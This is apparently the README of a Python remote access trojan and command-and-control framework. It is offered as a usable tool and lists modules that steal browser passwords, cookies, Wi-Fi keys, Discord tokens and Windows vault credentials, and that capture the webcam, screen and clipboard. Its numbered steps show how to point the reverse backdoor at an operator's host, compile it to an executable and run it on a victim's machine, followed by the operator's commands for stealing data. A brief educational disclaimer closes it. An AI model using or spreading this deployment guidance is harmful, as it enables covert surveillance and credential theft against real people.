# 🕷️ SPYDIRWARE - Python C2 / RAT Framework

> A stealthy, modular, and feature packed Command and Control (C2) framework written in Python.  
> Built for red teaming, remote access simulation, and malware development research.  
> **Developed by AnonSpyDir**

---

## ⚙️ Features

✅ Multi client Command & Control interface  
✅ Built in geolocation tracking (via IP)  
✅ Rich Terminal UI using [rich]  
✅ Base64-safe file transfer  
✅ Command aliases (shortcuts for quick ops)  
✅ Saves all logs + outputs per victim  
✅ Fully scriptable and modular  
✅ Compatible with Windows targets

---

## 🧩 Modules Included

From the victim's machine (`reverse_backdoor.py`):

- 📡 **System Command Execution**
- 📁 File Upload/Download
- 🖥️ Screenshot Capture
- 📷 Webcam Snapshot
- 🌐 Public IP + Geolocation
- 🧠 Wi-Fi Password Stealer
- 🔐 Chrome, Edge, Brave, Opera Password Stealer
- 🍪 Cookies & Autofill Dumper
- 🗂 Recent Files, User List, Installed Programs
- 📋 Clipboard Sniffer
- 🧪 VM & AV Detection
- 🎮 Discord Token Stealer
- 🧬 Windows Credential Vault Dumper

---

## 🖥️ How to Use

### 🧠 1. Launch the C2 Server

```bash
python spydirware.py
```
Make sure to change port in spydirware.py - Keep IP - 0.0.0.0

🧬 2. Deploy the Payload
Edit reverse_backdoor.py and replace:
```bash
HOST = "YOUR_IP_ADDRESS"
PORT = "YOUR_PORT"
```

Then run it on the victim's system (or compile it to .exe using PyInstaller).
```bash
python reverse_backdoor.py
```
Once connected, you'll see a new victim in the table.

✍️ Commands

From inside spydirware.py, use:
```bash
victims          - List connected bots
interact <id>    - Start command session with bot
aliases          - View command shortcuts
clear            - Refresh UI
exit             - Quit
```
Inside a victim session:
```bash
ls               - List files
pwd              - Show working dir
exec <cmd>       - Run any terminal command
screenshot       - Take screen capture
webcam_snap      - Snap a webcam photo
chrome_passwords - Steal saved Chrome passwords
...
```
All responses are saved under data/<username>/.

📁 Log Output
Every command result is saved to disk:
```bash
data/
└── user@host/
    ├── screenshot_20250420_153211.bin
    ├── wifi_passwords_20250420_153214.txt
    └── chrome_passwords_20250420_153221.txt

```
🔐 Disclaimer
This tool is provided for educational, research, and authorized red teaming purposes only.
You must not deploy it without explicit permission. Misuse may violate laws and terms of service.


